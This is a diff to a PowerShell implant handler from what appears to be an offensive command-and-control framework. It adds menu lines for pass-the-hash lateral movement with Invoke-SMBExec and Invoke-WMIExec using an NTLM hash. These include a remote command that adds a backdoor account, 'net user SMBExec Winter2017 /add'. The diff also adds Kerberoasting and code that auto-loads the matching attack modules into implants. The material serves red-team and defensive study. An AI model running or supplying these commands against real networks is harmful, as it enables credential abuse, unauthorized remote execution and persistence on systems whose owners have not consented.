@@ -162,7 +162,11 @@ function Implant-Handler
         write-host `n "Network Tasks / Lateral Movement: " -ForegroundColor Green
         write-host "==================" -ForegroundColor Red
         write-host " Get-ExternalIP" -ForegroundColor Green
-        write-host " Test-ADCredential -Domain test -User ben -Password Password1" -ForegroundColor Green  
+        write-host " Test-ADCredential -Domain test -User ben -Password Password1" -ForegroundColor Green 
+        write-host " Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0" -ForegroundColor Green
+        write-host " Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Password 52F1D3EE92F0" -ForegroundColor Green
+        write-host " Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
+        write-host " Invoke-WMIExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command `"net user SMBExec Winter2017 /add`"" -ForegroundColor Green
         write-host " Net View | Net Users | Whoami /groups | Net localgroup administrators | Net Accounts /dom" -ForegroundColor Green  
         write-host ' Get-NetUser -Filter "(userprincipalname=*@testdomain.com)" | Select-Object samaccountname,userprincipalname' -ForegroundColor Green 
         write-host ' Get-NetGroup -GroupName "Domain Admins" | %{ Get-NetUser $_.membername } | %{ $a=$_.displayname.split(" ")[0..1] -join " "; Get-NetUser -Filter "(displayname=*$a*)" } | Select-Object -Property displayname,samaccountname' -ForegroundColor Green 
@@ -172,6 +176,7 @@ function Implant-Handler
         write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
         write-host " Get-BloodHoundData -CollectionMethod 'Stealth' | Export-BloodHoundCSV" -ForegroundColor Green
         write-host " Get-BloodHoundData | Export-BloodHoundCSV" -ForegroundColor Green
+        write-host " Invoke-Kerberoast | f1" -ForegroundColor Green
         write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
         write-host " Invoke-Hostscan -IPRangeCIDR 172.16.0.0/24 (Provides list of hosts with 445 open)" -ForegroundColor Green
         write-host " Invoke-ShareFinder -hostlist hosts.txt" -ForegroundColor Green
@@ -887,7 +892,19 @@ param
             { 
                 CheckModuleLoaded "Inveigh.ps1" $psrandomuri
             }
+            if ($pscommand.ToLower().StartsWith('invoke-smbexec'))
+            { 
+                CheckModuleLoaded "Invoke-SMBExec.ps1" $psrandomuri
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-wmiexec'))
+            { 
+                CheckModuleLoaded "Invoke-WMIExec.ps1" $psrandomuri
+            }
             if ($pscommand.ToLower().StartsWith('get-net'))
+            { 
+                CheckModuleLoaded "PowerView.ps1" $psrandomuri
+            }
+            if ($pscommand.ToLower().StartsWith('invoke-kerb'))
             { 
                 CheckModuleLoaded "PowerView.ps1" $psrandomuri
             }
